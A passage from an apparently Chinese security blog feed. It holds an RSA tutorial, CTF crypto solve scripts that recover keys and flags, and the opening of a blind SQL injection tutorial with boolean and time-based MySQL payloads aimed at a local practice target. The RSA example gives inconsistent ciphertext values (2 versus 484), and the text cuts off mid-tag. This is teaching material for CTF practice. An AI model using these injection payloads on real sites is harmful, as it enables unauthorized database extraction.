Library，即GNU高精度算术运算库) 的封装。</p><p>安装gmpy2之前需要提前安装python3环境。</p><p>先检查一下是否安装wheel文件包，没有的话就安装下<code>pip install wheel</code>。</p><p>下载对应python版本的<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">whl文件</a>，然后<code>pip install [文件的路径]</code></p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><ul><li>gmpy2.mpz(n)</li></ul><p>初始化一个大整数</p><ul><li>gmpy2.invert(x, y)</li></ul><p>求x对于y的逆元z，x*z = 1 (mod y)</p><ul><li>gmpy2.is_prime(n)</li></ul><p>判断n是否为质数</p><ul><li>gmpy2.gcd(x, y)</li></ul><p>求x和y的最大公因数</p><ul><li>gmpy2.powmod(x, y, z)</li></ul><p>对x的y次方除以z求余</p><blockquote><p>P.s.</p><p>python自带一个pow()函数</p><ul><li>pow(x, y[, z])</li></ul><p>计算 x 的 y 次方，如果 z 在存在，则再对结果进行取模，其结果等效于 pow(x,y) %z</p></blockquote><br><h3 id="libnum"><a href="#libnum" class="headerlink" title="libnum"></a>libnum</h3><p>安装：pip install libnum</p><p><strong>Converting</strong></p><ul><li>s2n(s) - packed string to number</li><li>n2s(n) - number to packed string</li><li>s2b(s) - packed string to binary string</li><li>b2s(b) - binary string to packed string</li></ul><p>其它函数可以看GitHub项目里的说明：<a href="https://github.com/hellman/libnum">https://github.com/hellman/libnum</a></p><br><h2 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h2><p>在这里先确定一些字母的意思</p><p>m：信息(message)，原始数据，明文，也就是要加密的内容</p><p>e：加密(encrypt)，用于加密信息</p><p>c：密文(cipher)，加密后的信息</p><p>d：解密(decrypt)，用于解密密文</p><p>n：模数(modulus)，由两个互质的质数p和q相乘所得</p><br><h3 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h3><ul><li>取两个不相等的质数p和q（p和q越大越难被破解），则n = p * q</li><li>计算φ(n) = φ(p*q) = φ(p) * φ(q) = (p-1) * (q-1)</li><li>随机选取一个整数e，通常为65537</li><li>计算e对于φ(n)的模反元素d (d的计算在下面说明)</li></ul><p>由此便可生成公钥和私钥：</p><p>公钥：(n, e)</p><p>私钥：(n, d)</p><br><h3 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h3><p>加密：<br>$$<br>m^e \mod {n} = c<br>$$<br>解密：<br>$$<br>c^d \mod {n} = m<br>$$<br>即：</p><pre class="line-numbers language-none"><code class="language-none">c &#x3D; pow(m, e, n)m &#x3D; pow(c, d, n)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>对于加密公式，两边同时乘以一个正整数幂d，即：<br>$$<br>m^{ed} \mod {n} = c^d<br>$$<br>再对n取模，可得：<br>$$<br>(m^{ed} \mod{n}) \mod{n} = c^d \mod{n}<br>$$</p><p>$$<br>m^{ed} \mod{n} = m<br>$$</p><p>在上面我们由欧拉定理得到：<br>$$<br>m^{k\varphi(n)+1} \mod{n} \equiv m<br>$$<br>由这两个公式可得：<br>$$<br>ed = k\varphi(n)+1<br>$$</p><p>$$<br>d = \frac {k\varphi(n)+1} {e}<br>$$</p><p>如果直接从模反元素的定义出发，我们也可以得到<br>$$<br>ed \equiv 1 \pmod{ \varphi(n) }<br>$$<br>即存在整数k，使得<br>$$<br>ed-1 = k\varphi(n)<br>$$</p><p>$$<br>d = \frac {k\varphi(n)+1} {e}<br>$$</p><br><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>乙同学利用RSA与甲同学进行加密通信，首先乙同学得生成两把密钥（公钥和私钥）</p><p>假设他任意选取<strong>两个不相等的质数</strong>p=41、q=43，计算可得φ(1763) = φ(41<em>43) = (41-1)*(43-1) = 1680。(注意：*<em>m必须小于n</em></em>)</p><p>然后再随机选取一个整数e（注意：由模反元素的定义，<strong>φ(n)和e互质</strong>），这里选择e=65537。(<strong>较大数是质数的两个数互质</strong>)</p><p>由此计算d = (k*1680+1)/65537，解得其中一个解为 (d, k) = (593, 23133) ，所以d=593。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token variable">$k</span> <span class="token operator">&lt;</span> <span class="token number">30000</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">*</span><span class="token number">1680</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">65537</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_int</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"(d, k) = ("</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token operator">.</span><span class="token string double-quoted-string">", "</span><span class="token operator">.</span><span class="token variable">$k</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是乙同学对外公布了公钥 (n, e) = (1763, 65537)，自己保存私钥 (n, d) = (1763, 593)。</p><br><p>甲同学拿到公钥后想向乙同学发个字母<code>f</code>，由于<strong>RSA算法只能加密整数</strong>，所以用字母<code>f</code>的ASCII码 <code>102</code>。</p><p>加密过程：c = pow(m, e, n) = pow(102, 65537, 1763) =2，于是发给甲同学<code>484</code>。</p><p>甲同学拿到后，利用手中的私钥进行解密，即m = pow(c, d, n) = pow(484, 593, 1763) = <code>102</code>。</p><p>由此可以得知甲同学发过来的是字母<code>f</code>。</p><br><h2 id="HECTF2020-rsa"><a href="#HECTF2020-rsa" class="headerlink" title="[HECTF2020]rsa"></a>[HECTF2020]rsa</h2><pre class="line-numbers language-none"><code class="language-none">n &#x3D; 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423e &#x3D; 65537c &#x3D; 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以利用这个网站尝试分解n：<a href="http://factordb.com/">http://factordb.com/</a></p><p>分解得到：</p><pre class="line-numbers language-none"><code class="language-none">p &#x3D; 2499568793q &#x3D; 4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>已知p和q，可以计算φ(n)，即<code>phi</code>，然后求出私钥d，再用私钥解密密文c就可以得到原始数据m，最后将m转为字符串输出即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820</span>p <span class="token operator">=</span> <span class="token number">2499568793</span>q <span class="token operator">=</span> <span class="token number">4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;8fb873baba0df4a6423be9f4bd525d93&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h2 id="GUET-CTF2019-BabyRSA"><a href="#GUET-CTF2019-BabyRSA" class="headerlink" title="[GUET-CTF2019]BabyRSA"></a>[GUET-CTF2019]BabyRSA</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">p<span class="token operator">+</span>q <span class="token punctuation">:</span> <span class="token number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span><span class="token punctuation">(</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span>q<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span>e <span class="token punctuation">:</span> <span class="token number">0xe6b1bee47bd63f615c7d0a43c529d219</span>d <span class="token punctuation">:</span> <span class="token number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span>enc_flag <span class="token punctuation">:</span> <span class="token number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>已知c和d，只需要知道n即可，而n = p*q = (p+1)*(q-1) - (p+q) - 1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnuma <span class="token operator">=</span> <span class="token number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span>b <span class="token operator">=</span> <span class="token number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span>e <span class="token operator">=</span> <span class="token number">0xe6b1bee47bd63f615c7d0a43c529d219</span>d <span class="token operator">=</span> <span class="token number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span>c <span class="token operator">=</span> <span class="token number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span>n <span class="token operator">=</span> b<span class="token operator">-</span>a<span class="token operator">-</span><span class="token number">1</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h2 id="BJDCTF2020-RSA"><a href="#BJDCTF2020-RSA" class="headerlink" title="[BJDCTF2020]RSA"></a>[BJDCTF2020]RSA</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span>bytes_to_longflag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>e<span class="token operator">&lt;</span><span class="token number">100000</span><span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qm<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> c<span class="token punctuation">,</span>n<span class="token keyword">print</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">294</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>qm<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span><span class="token string">"BJD"</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span> c<span class="token punctuation">,</span>n<span class="token triple-quoted-string string">'''output:12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120  13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721  12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这道题中，两个n公用一个q，所以我们可以通过<code>gmpy2.gcd(x, y)</code>求出q，由此可以求出两个p的值，进而求出第一个n的φ(n)。</p><p>然而只知道e小于100000，不知道e的值还无法求<code>d = gmpy2.invert(e, phi)</code>。</p><p>但我们可以利用<code>print pow(294, e, n)</code>去爆破e，这样我们就可以解密<code>m = pow(c, d, n)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn1 <span class="token operator">=</span> <span class="token number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span>n2 <span class="token operator">=</span> <span class="token number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>p <span class="token operator">=</span> n1<span class="token operator">//</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>pow_294_e_n1 <span class="token operator">=</span> <span class="token number">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">294</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> n1<span class="token punctuation">)</span> <span class="token operator">==</span> pow_294_e_n1<span class="token punctuation">)</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> i        <span class="token keyword">break</span>c <span class="token operator">=</span> <span class="token number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">BJD&#123;p_is_common_divisor&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两种CTF中特殊盲注的总结</title>
      <link href="posts/20210204.html"/>
      <url>posts/20210204.html</url>
      
        <content type="html"><![CDATA[<p><strong>文章首发合天：<a href="https://mp.weixin.qq.com/s/2CShzOiY2GJ5tkyEerMqcw">两种CTF中特殊盲注的总结</a></strong></p><span id="more"></span><br><p>Blind SQL（盲注）是SQL注入攻击的其中一种。在sql注入过程中，sql语句执行后数据不会回显到前端页面，此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><h3 id="SQL盲注基本知识"><a href="#SQL盲注基本知识" class="headerlink" title="SQL盲注基本知识"></a>SQL盲注基本知识</h3><h4 id="常用基本函数"><a href="#常用基本函数" class="headerlink" title="常用基本函数"></a>常用基本函数</h4><ul><li>IF(expr1,expr2,expr3)</li></ul><p>若<code>expr1</code>为true，则返回<code>expr2</code>，为false则返回<code>expr3</code></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT IF(TRUE, &#39;A&#39;,&#39;B&#39;) -- 输出结果：ASELECT IF(FALSE,&#39;A&#39;,&#39;B&#39;) -- 输出结果：B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>ASCII(str)</li></ul><p>返回字符串<code>str</code>最左面字符的ASCII值</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT ASCII(&quot;flag&quot;) -- 输出结果：102<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ORD(str)</li></ul><p>返回字符串<code>str</code>第一个字符的ASCII值</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT ORD(&quot;flag&quot;) -- 输出结果：102<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>CHAR(int)</li></ul><p>将ASCII码值<code>int</code>转换成字符</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT CHAR(65) -- 输出结果：A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>MID(str,pos,len)</li></ul><p>从<code>pos</code>位置开始，截取字符串<code>str</code>共<code>len</code>个长度的字符</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT MID(&quot;Hello World&quot;, 3, 5) -- 输出结果：llo W<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>与SUBSTR(str,pos,len) 效果相同</p></blockquote><ul><li>LEFT(str,len)</li></ul><p>返回字符串<code>str</code>左边部分共<code>len</code>个字符</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT LEFT(&quot;flag&quot;, 2) -- 输出结果：fl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>SLEEP(duration)</li></ul><p><code>duration</code>是休眠的时长，以秒为单位，也可以是小数</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT SLEEP(3)# [SQL] SELECT SLEEP(3)# 受影响的行: 0# 时间: 3.005ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>REGEXP</li></ul><p>正则表达式，用来匹配文本的特殊的串（字符集合）</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT &quot;FLAG&quot; REGEXP &quot;LA&quot;    -- 输出结果：1SELECT &quot;FLAG&quot; REGEXP &quot;[0-9]&quot; -- 输出结果：0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>其它</li></ul><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">LENGTH(str) -- 返回字符串str的长度DATABASE()  -- 返回当前数据库名VERSION()   -- 返回当前MySQL版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT IF(LENGTH(DATABASE())&gt;3, 1, 2) -- 输出结果：1SELECT IF(LENGTH(DATABASE())&gt;4, 1, 2) -- 输出结果：2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>据此可知数据库名的长度为<code>4</code></p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>通过执行时间的长短来判断是否执行成功，也就是时间延迟注入。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT IF(MID(DATABASE(),1,1)&#x3D;&#39;c&#39;, SLEEP(3), 2) -- 3秒后才响应SELECT IF(MID(DATABASE(),1,1)&#x3D;&#39;a&#39;, SLEEP(3), 2) -- 立即响应<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>据此可知数据库名的第一个字符为<code>c</code></p><br><p>以下2道题目：flag在flag表的flag字段</p><p>在本地搭建靶机，用post传参，变量<code>keywords</code>接收</p><p><img src="https://s3.ax1x.com/2021/02/04/y3m100.png"></p><br><h3 id="基于运行错误的布尔盲注"><a href="#基于运行错误的布尔盲注" class="headerlink" title="基于运行错误的布尔盲注"></a>基于运行错误的布尔盲注</h3><p>基于运行错误的布尔盲注即能够通过sql语句的语法、语义分析，但运行时报错。</p><p>我们可以将其作为IF(expr1,expr2,expr3)的<code>expr3</code>，当<code>expr1</code>为true时，返回<code>expr2</code>，页面正常，而为false时，则会执行<code>expr3</code>，此时因为运行错误而页面无法正常显示。</p><p>ST_GeomFromText(character-string[, srid]) 是根据字符串表示构造几何的方法，即：</p><pre 